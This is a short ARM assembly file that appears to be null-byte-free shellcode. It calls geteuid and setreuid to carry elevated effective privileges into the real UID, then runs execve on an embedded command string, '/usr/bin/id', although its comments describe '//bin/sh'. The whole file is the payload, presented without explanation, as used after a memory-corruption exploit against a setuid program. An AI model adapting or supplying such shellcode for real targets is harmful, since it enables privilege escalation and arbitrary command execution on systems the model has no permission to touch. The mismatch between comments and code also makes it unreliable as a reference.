.section .text
.global _start

_start:

@ enter thumbmode (avoid null bytes)
.code 32
add r6, pc, #1
bx r6

.code 16
@ uid_t geteuid(void)
@ r7: 49

mov r7, #49		    @ geteuid
svc 1			        @ execute syscall (no null bytes)

@ int setreuid(uid_t ruid, uid_t euid)
@ r0: r0 (geteuid return value)
@ r1: r0 
@ r7: 70  
mov r1, r0
mov r7, #70		    @ setreuid
svc 1

@ execve(const char *filename, char *const argv[],char *const envp[]);
@ r0: //bin/sh
@ r1: //bin/sh
@ r2: 0
@ r7: 11 (syscall number for execve) 
sub r2,r2,r2
mov r0, pc
add r0, #8    		@ 2 * intstructions before .ascii 
str r0, [sp, #4]
add r1, sp, #4
mov r7, #11      	@ execve
svc 1             @ syscall

.ascii "/usr/bin/id"
